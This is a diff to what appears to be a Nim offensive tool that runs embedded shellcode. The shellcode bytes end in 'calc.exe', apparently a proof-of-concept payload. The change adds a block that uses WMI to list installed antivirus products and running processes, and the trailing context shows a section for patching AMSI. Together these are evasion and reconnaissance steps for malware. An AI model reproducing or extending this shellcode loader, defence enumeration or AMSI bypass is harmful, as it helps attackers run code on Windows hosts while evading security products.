@@ -1,5 +1,6 @@
 import execution
 import winim
+import winim/com
 import osproc
 
 when isMainModule:
@@ -55,6 +56,18 @@ when isMainModule:
       0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
       0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
       0x63,0x2e,0x65,0x78,0x65,0x00]  
+
+  when defined(LIST_AV):
+    echo "[LIST AV]"
+    var
+      wmi = GetObject(r"winmgmts:{impersonationLevel=impersonate}!\\.\root\securitycenter2")
+    for i in wmi.execQuery("SELECT displayName FROM AntiVirusProduct"):
+        echo "  AntiVirusProduct: ", i.displayName
+    
+    echo "Getting processes"
+    wmi = GetObject(r"winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
+    for i in wmi.execQuery("select * from win32_process"):
+      echo i.handle, ", ", i.name
 
   when defined(PATCH_AMSI):
     import strformat
